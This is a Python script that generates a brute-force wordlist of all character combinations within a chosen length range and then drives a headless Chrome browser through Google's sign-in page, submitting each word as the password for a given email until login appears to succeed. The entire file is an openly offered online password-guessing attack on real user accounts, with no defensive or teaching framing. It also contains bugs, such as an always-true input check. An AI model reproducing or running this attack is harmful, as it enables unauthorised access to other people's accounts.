from itertools import product
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
x = ""
#This checks to see if you already got a list to avoid making a whole new list which takes forever
print("Do you have list already? Y/N")
x = input();
if x == "N" or "n":
  #Grabs input to see how big the string or password has to be and limits the scopes
  min_len = int(input("Enter minimn length of password: "))
  max_len = int(input("Enter maxium length of password: "))
  counter = 0
  #This allows the character to be any number, capital letter, normal letter, and weird special character
  character = string.ascii_lowercase+string.ascii_uppercase+string.digits+string.punctuation
  
  file_open = open("Wordlist.txt",'w')
  #For loop that keeps going on forever until it does the maxium length of the password
  for i in range(min_len,max_len+1):
    #The actual things that writes the password and puts it into the word file\
    for j in product(character,repeat=i):
      word = "".join(j)
      file_open.write(word)
      file_open.write('\n')
      counter+=1
  print("Wordlist of {} passwords created".format(counter))
# Path to your Chromedriver
chromedriver_path = '/path/to/chromedriver'
# Set up the Chrome browser
options = webdriver.ChromeOptions()
options.add_argument('headless')  # Run in headless mode (no GUI)
driver = webdriver.Chrome(service_log_path='chromedriver.log', options=options)
# Navigate to Gmail's login page and find the email field
driver.get('https://accounts.google.com/signin')
email_field = driver.find_element_by_name('identifier')
# Input your email address and press Enter to proceed to the next page
email_field.send_keys('youremail@gmail.com')
email_field.send_keys(Keys.RETURN)
# Define the path to your wordlist file
wordlist_path = 'Wordlist.txt'
# Open the wordlist file and try each password
with open(wordlist_path, 'r') as f:
    for line in f:
        # Strip any newline characters from the word
        password = line.strip()
        # Find the password field and input the password
        password_field = driver.find_element_by_name('password')
        password_field.send_keys(password)
        # Click the "Next" button to log in
        next_button = driver.find_element_by_xpath("//button[@class='VfPpkd-LgbsSe']")
        next_button.click()
        # Check if login was successful
        if "Enter a password" not in driver.page_source:
            print("Correct password is:", password)
            break
        # Clear the password field and try the next password
        password_field.clear()
# Close the browser
driver.quit()
